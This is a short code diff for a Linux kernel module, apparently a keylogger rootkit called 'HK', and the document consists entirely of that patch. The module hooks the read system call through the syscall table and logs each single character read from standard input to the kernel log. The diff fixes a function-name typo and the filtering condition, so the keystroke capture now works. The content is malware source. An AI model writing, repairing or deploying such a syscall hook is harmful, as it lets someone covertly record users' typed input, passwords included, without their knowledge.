@@ -25,7 +25,7 @@ unsigned long *syscall_table = NULL;
 asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
 
 
-static int set_syscall_table() {
+static int set_syscall_table(void) {
   char system_map_entry[MAX_VERSION_LEN];
   struct file *f = NULL;
   unsigned int i = 0;
@@ -90,15 +90,14 @@ static int set_syscall_table() {
 
 asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
   long error = original_read_syscall(fd, buf, count);
-  if (error || count || count > 1 || fd != 0) {
-    return error;
+  if (count == 1 && fd == 0) {
+    printk(KERN_INFO "HK:\t\t%c\n", buf[0]);
   }
-  printk(KERN_INFO "HK: char\t%c\n", buf[0]);
   return error;
 }
 
 static int __init hk_module_init(void){
-  if (set_syscal_table() != 0) {
+  if (set_syscall_table() != 0) {
     printk(KERN_EMERG "HK: error loading syscall_table\n");
   }
 
